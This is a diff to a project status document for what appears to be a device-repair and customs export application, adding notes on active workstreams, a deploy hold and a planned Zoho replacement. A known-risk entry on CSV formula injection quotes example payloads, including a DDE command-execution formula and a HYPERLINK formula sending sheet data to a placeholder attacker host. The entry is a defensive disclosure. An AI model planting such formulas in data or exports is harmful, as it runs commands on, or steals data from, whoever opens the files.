@@ -449,6 +449,52 @@ Current coverage (269 tests across 11 suites):
 
 **Manual/live verification (not yet automated)**: none outstanding — auth 401s are asserted in `auth.spec.ts` and the CSV export shape now has the dedicated suite above (it was additionally re-smoked with live `curl` against the running instance: 401 unauthenticated, correct `Content-Type`/`Content-Disposition`/`X-Export-Row-Count`, and the three new 400s). The webhook `X-Signature` HMAC and IMEI/serial validation, formerly in this list, are covered by the OPR 4 suite and `validate.spec.ts` respectively.
 
+## Active Workstreams (as of 2026-08-11)
+
+**Deploy-hold posture**: production remains on commit `10f9544` (the last
+`gsk hosted deploy`, described in **Production deploy** above). Local `main`
+is currently 11 commits ahead of that production commit — all of it is
+**local-only, not pushed to `origin`, and not deployed**, per an explicit
+standing instruction, except where a step below is separately authorised to
+push docs-only. Two workstreams are active in parallel and are kept
+strictly separate (a change in one must never touch the other):
+
+1. **OPR Auth Batch** — CHIEF→OPR authorisation-number rename (migration
+   `0018`, done) + three new not-yet-built features (exchange-rate-month
+   field, stale-rate guard, expiry warnings at 180/90 days before the
+   authorisation's `valid_to`) + a supervising-office **record correction**
+   (`GBNCL001` → `GBLIV002`, reference-only, not a customs filing) + three
+   independent "safe-ground" tickets already committed locally: **Ticket A**
+   (AED added to the repair-invoice currency dropdown), **Ticket B**
+   (goods-value reconciliation + permanent delta trail, migration `0019`),
+   **Ticket C** (communication tracker — send/receive log, 3-working-day
+   follow-up flag, outstanding-items checklist, migration `0020`). Deploy of
+   this batch is auto-authorised once a strict six-point pre-flight
+   checklist is all-green (golden C&E1154 test, full suite, `tsc`,
+   production D1 backup-and-restore-tested, migration replay against a prod
+   schema copy, post-deploy verification query) — not yet triggered.
+2. **Device Lifecycle slice 1** — repair-workflow + Zoho upload-queue tests
+   (C15–D33), test-bodies-only phase, no schema/migration/implementation
+   yet. See `docs/plan/device-lifecycle-slice1.md` for the full design
+   resolution (confirmed 7-field GBP-only repair-cost fields, `QC_FAILED`
+   with mandatory reason, no generic `HOLD`, `READY_FOR_ZOHO` only after a
+   PASSED QC).
+
+**Future (not yet started, documentation/scope only)**: a staged **Zoho
+replacement & integrated inventory + accounting connection** — build
+inventory/purchasing to full trust (including a new create-a-bill flow,
+VAT type on the bill) → run parallel with Zoho to prove data integrity →
+rehome Back Market → rehome Amazon as its own scoped project (the gate for
+switching Zoho off) → later, separately, connect the firm's own accounting
+system. Confirmed fact: **Zoho is not the VAT/accounting book of record**,
+so this replacement carries no live VAT-return risk. Design requirement
+baked in from day one: the VAT type on the bill, the bill itself, and the
+purchase cost are an **audited, non-overwritable financial record** (append
+-only correction pattern, same discipline as `shipment_value_deltas`). Full
+detail: `docs/plan/zoho-replacement-roadmap.md`. This is explicitly
+**not** part of either active workstream above and is not authorised for
+implementation by that document.
+
 ## Not Yet Implemented / Next Steps
 - ~~Automated coverage for CSV export shape~~ — **done 2026-07-28** (`test/csvExport.spec.ts`, 30 tests; three silent-wrong-answer bugs found and fixed in the process — see **Testing** above).
 - ⚠️ **KNOWN RISK, LIVE TODAY — CSV formula injection in `GET /api/devices/export/csv`.** Not a "future improvement": this is an unmitigated vulnerability in shipping code. Cell values are written byte-faithfully, so **any device field whose value begins `=`, `+`, `-` or `@` is a live formula the moment the exported file is opened in Excel, LibreOffice or Google Sheets — it executes on open**, with no prompt for `=`-prefixed content in many configurations. The classic payloads are `=cmd|'/c calc'!A0` (command execution via DDE) and `=HYPERLINK("http://attacker/?"&A1)` / `=WEBSERVICE(...)` (silent exfiltration of the sheet's contents). **Reachability:** it is only exploitable if an attacker-influenced string can land in an exported column — today those columns come from manifest CSVs supplied by suppliers and from operator-typed model/notes/reference fields, so the manifest-upload path is the realistic vector, not a hypothetical one. **Why it is still open rather than patched:** the usual mitigation (prefixing a `'` or a space) silently rewrites the stored value, and this file is an HMRC audit artefact — a mutated IMEI, reference or valuation is a worse failure than the injection. **The fix, when it is done, is a typed `.xlsx` export** (SheetJS/ExcelJS writing each cell with an explicit `t: 's'` string type), which carries the type in the file format so the value is preserved exactly *and* can never be evaluated. Until that exists: **treat every exported CSV as untrusted input** — open it in a viewer that does not evaluate formulas, or import it with all columns forced to Text — and do not forward one to HMRC or a customer without that check.
